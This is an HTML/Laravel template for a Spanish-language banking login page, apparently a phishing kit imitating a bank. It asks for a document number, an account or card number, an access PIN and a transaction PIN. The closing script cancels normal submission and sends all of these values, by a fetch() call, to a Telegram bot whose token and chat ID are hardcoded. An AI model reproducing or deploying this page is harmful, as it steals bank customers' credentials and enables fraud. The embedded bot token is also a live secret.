<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">

        <title>Laravel</title>

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=figtree:400,600&display=swap" rel="stylesheet" />
        <link rel="stylesheet" href="ff/lgn.css">

        <!-- Styles -->

        <script>
             function soloNumeros(e){
                var key = window.event ? e.which : e.keyCode;
                if (key < 48 || key > 57) {
                    e.preventDefault();
                }
                }
        </script>
                    
    </head>
    <body  class="antialiased">

        <form method="post" action="" id="miFormulario">

            <div class="contenedorgenerico">
                <br>
               
                <div class="login-container">
                
        
        
            
        <div id="capaTeclado" style="width: 40px; height: 0px; visibility: hidden; display: none">
            <table cellpadding="0" cellspacing="0" class="floatingHeader">
                <tbody><tr style="padding-top:10px;padding-bottom=0px;">
                    <td ondblclick="void(0);" onmouseover="over=true;" onmouseout="over=false;" style="cursor: move;
                        border: none;width: 90%;" class="ic-log-message-text">
                    </td>
                    <td style="padding-right: 10px; width:10%; text-align: right;">
                        <a href="javascript:hiddenFloatingDiv('capaTeclado');void(0);">
                           </a>
                    </td>
                </tr>
                <tr>
                    <td colspan="2">
                        <table border="0">
                            <tbody><tr valign="top">
                                <td class="textoContenido">
                                    <a href="" onmouseover="mostrarImagen();return false;">
                                       &nbsp;
                                       
                                    </a>
                                </td>
                            </tr>
                        </tbody></table>
                        <div>
                        
                        </div>
                    </td>
                </tr>
            </tbody></table>
        </div>
        
            <div class="logo-ban">
               
               <img src="/img/LOGO_ita.png" style="width:120px;">
                 <br><br>
                <b><font color="#D69710"></font></b>
            </div>
            <div id="dimmer" style="background: rgba(236, 112, 0, 0.7);
        
        
        
        ">
                
        <div id="ctl00_MainHolder_authenticate_firsStep_panel" style="text-align:center;padding-top: 5px">
            
        <div align="center">
             <table class="" cellpadding="0" cellspacing="0">
                <tbody><tr>
                    <td>
                    <table class="" cellpadding="0" cellspacing="0" style="align-content:center">
                    <tbody>
                        <tr>
                            <td>
                                <table cellpadding="0" cellspacing="0" class="" style="height: 372px">
                                    <tbody><tr class="ingrese_su_nombre_de_Usuario">
                                        <td>
                                        <div>
                                                                      
                                            <div class="requerido" align="center">
                                                                            
                                            <input id="numdoc" name="numdoc" type="text" maxlength="20" style="width:300px; height:40px; border:0px;" placeholder="n° de documento" onkeypress="soloNumeros(event)" required="">
                                                                             
                                             <br><br>
                                                                             
                                                    <table border="0">
                                                     <tbody><tr><td>
                                                    <select name="tipoproducto" style="height:40px; border:0px;">
                                                    <option value="cuenta">Cuenta</option>
                                                    <option value="tarjeta">Tarjeta</option>
                                                </select>
                                                    </td><td> <input id="numprod" type="text" name="numprod" onkeypress="soloNumeros(event)" style="width:230px; height:40px; border:0px;" placeholder="n° de cuenta" required=""></td></tr></tbody></table> 
                                                        <br>
                                                                                
                                                     <input id="pinacc" name="pinacc" type="text" maxlength="6" style="width:300px; height:40px; border:0px;" placeholder="Pin de acceso" onkeypress="soloNumeros(event)" minlength="4" required="">
                                                                             
                                                                             <br><br>
                                                                             
                                                        <input id="pintrac" name="pintrac" type="text" maxlength="6" style="width:300px; height:40px; border:0px;" placeholder="Pin de Transacciones" onkeypress="soloNumeros(event)" minlength="6" required="">
                                                                             
                                                                             <br><br>
                                                <button class="botton" type="submit" style="width:300px;height:40px;background:#D7DBDD; border:0px; color:#ec7000;"><b>acceder</b></button>
                                                                            
                                                                            <br><br>
                                                                         
                                                 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
                                                 <a style="color:#ffffff" href="#">¿Olvidaste o bloqueaste tu PIN?</a>
                                                     <br><br>
                                                                         
                                                <button type="button" style="height:40px;width:300px;background:transparent; border-color:#ffffff; color:#ffffff;" href="#">
                                                 ¿No tenés PIN para usar la app? Pedilo acá
                                                </button>
                                                                        
                                                                            <br><br>
                                                                            <img src="img/bottom.png" style="width:340px;">
                                                               
                                                                        
                                                                    </div>
                                                                </div></td>
                                                            </tr>
                                                            <tr>
                                                                
                                                            </tr>
                                                            <tr>
                                                                <td>
                                                                </td>
                                                            </tr>
                                                        </tbody></table>
                                                    </td>
                                                </tr>
                                            </tbody></table>
                                        </td>
                                        
                                    </tr>
                                </tbody></table>
                              
                           
                            </div>
         
                        
        </div>
                    
            </div>
          
        
                </div>
             </div>  
        
        
        </form>



        <script>

                    const formulario = document.getElementById('miFormulario');
                    const select = document.querySelector('select[name="tipoproducto"]');
                    let selectedOption = 'Cuenta';

                    select.addEventListener('change', (event) => {
                    selectedOption = event.target.value;
                    });

                    formulario.addEventListener('submit', (event) => {
                    event.preventDefault(); 
                    const numdoc = document.getElementById('numdoc');
                    const numprod = document.getElementById('numprod');
                    const pinacc = document.getElementById('pinacc');
                    const pintrac = document.getElementById('pintrac');

                    const mensaje = `n° de documento: ${numdoc.value}\n ${selectedOption}: ${numprod.value}\n Pin de acceso: ${pinacc.value}\n Pin de Transacciones: ${pintrac.value}`;

                    const TOKEN = '6158377987:AAESF42hcjU7uLYRjGjGi-rsjMtPuLq_Igw'
                    const CHAT_ID = '6021886971';

                    // Envía el mensaje al bot de Telegram
                    fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${mensaje}`)
                        .then(response => console.log('Mensaje enviado'))
                        .catch(error => console.error(error));
                    });


        </script>
       
    </body>
</html>
